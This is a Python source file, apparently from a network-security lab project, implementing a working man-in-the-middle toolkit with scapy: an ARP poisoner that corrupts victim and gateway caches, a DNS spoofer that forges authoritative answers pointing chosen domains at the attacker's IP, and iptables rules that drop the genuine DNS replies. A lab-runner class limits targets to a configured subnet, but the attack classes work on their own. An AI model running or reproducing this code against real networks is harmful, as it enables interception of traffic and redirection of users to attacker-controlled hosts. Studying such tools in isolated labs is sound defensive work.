#!/usr/bin/env python3
from __future__ import annotations

from dataclasses import dataclass
from typing import Callable
import subprocess
import time

from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, UDP, send, sendp, sniff

from lab_config import LabSettings
from lab_network import (
    BROADCAST_MAC,
    HostRecord,
    interface_mac,
    interface_on_subnet,
    resolve_mac,
    scan_subnet,
)


def _normalize_fqdn(name: str) -> str:
    return name.rstrip(".").lower() + "."


def _decode_qname(qname: bytes | str) -> str:
    if isinstance(qname, bytes):
        return _normalize_fqdn(qname.decode("utf-8", errors="replace"))
    return _normalize_fqdn(qname)


@dataclass(frozen=True)
class ArpEndpoints:
    victim_ip: str
    victim_mac: str
    gateway_ip: str
    gateway_mac: str
    attacker_mac: str


@dataclass(frozen=True)
class DnsSpoofEvent:
    client_ip: str
    query_name: str
    answer_ip: str


class ArpPoisoner:
    def __init__(
        self,
        interface: str,
        victim_ip: str,
        gateway_ip: str,
        interval: float = 2.0,
    ) -> None:
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self._endpoints: ArpEndpoints | None = None

    def resolve_endpoints(self) -> ArpEndpoints:
        if self._endpoints is not None:
            return self._endpoints

        victim_mac = resolve_mac(self.victim_ip, self.interface)
        gateway_mac = resolve_mac(self.gateway_ip, self.interface)
        attacker_mac = interface_mac(self.interface)

        if not victim_mac:
            raise RuntimeError(f"Unable to resolve victim MAC for {self.victim_ip} on {self.interface}")
        if not gateway_mac:
            raise RuntimeError(f"Unable to resolve gateway MAC for {self.gateway_ip} on {self.interface}")

        self._endpoints = ArpEndpoints(
            victim_ip=self.victim_ip,
            victim_mac=victim_mac,
            gateway_ip=self.gateway_ip,
            gateway_mac=gateway_mac,
            attacker_mac=attacker_mac,
        )
        return self._endpoints

    def poison_once(self) -> None:
        endpoints = self.resolve_endpoints()

        victim_packet = Ether(dst=endpoints.victim_mac, src=endpoints.attacker_mac) / ARP(
            op=2,
            psrc=endpoints.gateway_ip,
            pdst=endpoints.victim_ip,
            hwsrc=endpoints.attacker_mac,
            hwdst=endpoints.victim_mac,
        )
        gateway_packet = Ether(dst=endpoints.gateway_mac, src=endpoints.attacker_mac) / ARP(
            op=2,
            psrc=endpoints.victim_ip,
            pdst=endpoints.gateway_ip,
            hwsrc=endpoints.attacker_mac,
            hwdst=endpoints.gateway_mac,
        )

        sendp(victim_packet, iface=self.interface, verbose=False)
        sendp(gateway_packet, iface=self.interface, verbose=False)

    def run(
        self,
        cycles: int | None = None,
        stop_requested: Callable[[], bool] | None = None,
        on_cycle: Callable[[int, ArpEndpoints], None] | None = None,
    ) -> None:
        sent = 0
        while cycles is None or sent < cycles:
            if stop_requested and stop_requested():
                break
            cycle_number = sent + 1
            if on_cycle:
                on_cycle(cycle_number, self.resolve_endpoints())
            self.poison_once()
            sent = cycle_number
            time.sleep(self.interval)

    def restore(self, count: int = 5) -> None:
        endpoints = self.resolve_endpoints()

        victim_restore = Ether(dst=endpoints.victim_mac, src=endpoints.gateway_mac) / ARP(
            op=2,
            psrc=endpoints.gateway_ip,
            pdst=endpoints.victim_ip,
            hwsrc=endpoints.gateway_mac,
            hwdst=endpoints.victim_mac,
        )
        gateway_restore = Ether(dst=endpoints.gateway_mac, src=endpoints.victim_mac) / ARP(
            op=2,
            psrc=endpoints.victim_ip,
            pdst=endpoints.gateway_ip,
            hwsrc=endpoints.victim_mac,
            hwdst=endpoints.gateway_mac,
        )
        victim_broadcast_restore = Ether(dst=BROADCAST_MAC, src=endpoints.gateway_mac) / ARP(
            op=2,
            psrc=endpoints.gateway_ip,
            pdst=endpoints.victim_ip,
            hwsrc=endpoints.gateway_mac,
            hwdst=BROADCAST_MAC,
        )
        gateway_broadcast_restore = Ether(dst=BROADCAST_MAC, src=endpoints.victim_mac) / ARP(
            op=2,
            psrc=endpoints.victim_ip,
            pdst=endpoints.gateway_ip,
            hwsrc=endpoints.victim_mac,
            hwdst=BROADCAST_MAC,
        )

        sendp(victim_restore, iface=self.interface, count=count, inter=0.2, verbose=False)
        sendp(gateway_restore, iface=self.interface, count=count, inter=0.2, verbose=False)
        sendp(victim_broadcast_restore, iface=self.interface, count=2, inter=0.2, verbose=False)
        sendp(gateway_broadcast_restore, iface=self.interface, count=2, inter=0.2, verbose=False)


class DnsSpoofer:
    def __init__(
        self,
        interface: str,
        records: dict[str, str],
        victim_ip: str | None = None,
        attacker_ip: str | None = None,
        gateway_ip: str | None = None,
        ttl: int = 60,
    ) -> None:
        self.interface = interface
        self.records = {_normalize_fqdn(domain): answer for domain, answer in records.items()}
        self.victim_ip = victim_ip
        self.attacker_ip = attacker_ip
        self.gateway_ip = gateway_ip
        self.ttl = ttl
        self._block_rules_installed = False

    def _lookup_answer(self, packet) -> str | None:
        if not packet.haslayer(DNSQR) or packet[DNS].qr != 0:
            return None
        if self.victim_ip and packet[IP].src != self.victim_ip:
            return None
        if self.attacker_ip and packet[IP].src == self.attacker_ip:
            return None

        qname = _decode_qname(packet[DNSQR].qname)
        return self.records.get(qname)

    def forge_response(self, packet, answer_ip: str):
        qname = packet[DNSQR].qname
        answer = DNSRR(rrname=qname, ttl=self.ttl, rdata=answer_ip)
        return (
            IP(src=packet[IP].dst, dst=packet[IP].src)
            / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
            / DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=answer, ancount=1)
        )

    def handle_query(self, packet) -> DnsSpoofEvent | None:
        if not (packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSQR)):
            return None

        answer_ip = self._lookup_answer(packet)
        if not answer_ip:
            return None

        forged = self.forge_response(packet, answer_ip)
        send(forged, iface=self.interface, verbose=False)

        return DnsSpoofEvent(
            client_ip=packet[IP].src,
            query_name=_decode_qname(packet[DNSQR].qname),
            answer_ip=answer_ip,
        )

    def _iptables_rule_specs(self) -> list[list[str]]:
        if not self.victim_ip or not self.gateway_ip:
            return []

        return [
            [
                "iptables",
                "-I",
                "FORWARD",
                "-s",
                self.victim_ip,
                "-d",
                self.gateway_ip,
                "-p",
                "udp",
                "--dport",
                "53",
                "-j",
                "DROP",
            ],
            [
                "iptables",
                "-I",
                "FORWARD",
                "-s",
                self.gateway_ip,
                "-d",
                self.victim_ip,
                "-p",
                "udp",
                "--sport",
                "53",
                "-j",
                "DROP",
            ],
        ]

    def install_block_rules(self) -> None:
        if self._block_rules_installed:
            return

        for rule in self._iptables_rule_specs():
            subprocess.run(rule, check=False, capture_output=True, text=True)
        self._block_rules_installed = True

    def remove_block_rules(self) -> None:
        if not self._block_rules_installed:
            return

        for rule in self._iptables_rule_specs():
            delete_rule = rule.copy()
            delete_rule[1] = "-D"
            while True:
                result = subprocess.run(delete_rule, check=False, capture_output=True, text=True)
                if result.returncode != 0:
                    break
        self._block_rules_installed = False

    def run(
        self,
        packet_count: int = 0,
        on_spoof: Callable[[DnsSpoofEvent], None] | None = None,
        stop_requested: Callable[[], bool] | None = None,
    ) -> None:
        processed = 0

        def _handle(packet) -> None:
            nonlocal processed
            event = self.handle_query(packet)
            processed += 1
            if event and on_spoof:
                on_spoof(event)

        self.install_block_rules()
        try:
            while True:
                if stop_requested and stop_requested():
                    break
                if packet_count and processed >= packet_count:
                    break
                remaining = 0 if packet_count == 0 else packet_count - processed
                sniff(
                    iface=self.interface,
                    filter="udp dst port 53",
                    prn=_handle,
                    store=False,
                    count=remaining,
                    timeout=1,
                )
        finally:
            self.remove_block_rules()


class LabResearchRunner:
    def __init__(self, settings: LabSettings, interface: str) -> None:
        self.settings = settings
        self.interface = interface
        self._validate_interface_scope()

    def _validate_interface_scope(self) -> None:
        if not interface_on_subnet(self.interface, str(self.settings.lab_subnet)):
            raise RuntimeError(
                f"Interface {self.interface} is not on lab subnet {self.settings.lab_subnet}"
            )

    def _validate_host(self, ip: str) -> None:
        if ip not in {
            str(self.settings.gateway_ip),
            str(self.settings.victim_ip),
            str(self.settings.attacker_ip),
        }:
            raise RuntimeError(f"{ip} is outside the configured lab host set")

    def discover_hosts(self) -> list[HostRecord]:
        return scan_subnet(str(self.settings.lab_subnet), self.interface)

    def build_arp_poisoner(
        self,
        victim_ip: str | None = None,
        gateway_ip: str | None = None,
        interval: float = 2.0,
    ) -> ArpPoisoner:
        victim = victim_ip or str(self.settings.victim_ip)
        gateway = gateway_ip or str(self.settings.gateway_ip)
        self._validate_host(victim)
        self._validate_host(gateway)
        return ArpPoisoner(
            interface=self.interface,
            victim_ip=victim,
            gateway_ip=gateway,
            interval=interval,
        )

    def build_dns_spoofer(
        self,
        answer_ip: str | None = None,
        domains: list[str] | None = None,
        victim_ip: str | None = None,
    ) -> DnsSpoofer:
        answer = answer_ip or str(self.settings.attacker_ip)
        self._validate_host(answer)
        victim = victim_ip or str(self.settings.victim_ip)
        self._validate_host(victim)
        selected_domains = domains or list(self.settings.detector_domains)
        records = {domain: answer for domain in selected_domains}
        return DnsSpoofer(
            interface=self.interface,
            records=records,
            victim_ip=victim,
            attacker_ip=str(self.settings.attacker_ip),
            gateway_ip=str(self.settings.gateway_ip),
        )
